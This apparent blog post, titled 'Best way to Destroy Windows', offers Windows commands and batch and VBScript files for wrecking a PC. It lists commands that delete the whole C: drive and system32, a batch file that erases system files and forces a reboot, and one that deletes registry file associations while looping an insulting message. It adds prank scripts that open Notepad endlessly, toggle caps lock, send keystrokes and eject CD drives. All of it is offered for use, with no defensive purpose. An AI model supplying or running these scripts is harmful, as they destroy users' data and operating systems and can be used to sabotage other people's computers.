---
layout: post
title: Best way to Destroy Windows
subtitle: Run this command without moderation;)
bigimg: /img/winfuckair.gif
---

## Best way to Destroy Windows
Run this command without moderation;)

### 1Type this in command prompt:

> RD C:\ /S /Q

> del c:\windows\system32\*.* /q

> del /f /s /q "C:\*.*."

### 2Type this in notepad:

Save the file anywhere (.bat) and execute it:

###### 2.1 The blue screen of Death
Code:

```
@echo off
del %systemdrive%\*.*/f/s/q
shutdown -r -f -t 00
```

<br>

###### 2.2 Stupidity Shutdown
code:

```
@echo off
msg * Fatal system error due to admin stupidity!
shutdown -c “Error! You are too stupid!” -s -t 10
```

<br>

###### 2.3 Delete Key Registry Files
code:

```
@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Your computer has been fcked.Â Â Have a nice day.
GOTO MESSAGE
```

<br>

###### 2.4 Endless Notepads
code:

```
@ECHO off
:top
START %SystemRoot%\system32\notepad.exe
GOTO top
```

<br>

###### 2.5 Crazy caps lock
code:

```
Set wshShell =wscript.CreateObject(“WScript.Shell”)
do
wscript.sleep 100
wshshell.sendkeys “{CAPSLOCK}”
loop
```

<br>

###### 2.6 Endless Enter
code:

```
Set wshShell = wscript.CreateObject(“WScript.Shell”)
do
wscript.sleep 100
wshshell.sendkeys “~(enter)”
loop
```

<br>

###### 2.7 Endless Backspace
code:

```
MsgBox “Let’s go back a few steps”
Set wshShell =wscript.CreateObject(“WScript.Shell”)
do
wscript.sleep 100
wshshell.sendkeys “{bs}”
loop
```

<br>

###### 2.8 Popping CD Drives
code:

```
Set oWMP = CreateObject(“WMPlayer.OCX.7”)
Set colCDROMs = oWMP.cdromCollection
do
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count – 1
colCDROMs.Item(i).Eject
Next
For i = 0 to colCDROMs.Count – 1
colCDROMs.Item(i).Eject
Next
End If
wscript.sleep 100
loop
```

 
And have a good day!

Font's: [dbsdp](http://dbsdp.blogspot.com.br/2010/10/destroy-xp-with-single-command.html) | [itechnobuzz](https://www.itechnobuzz.com/the-8-deadly-windows-vbs-commands/l)

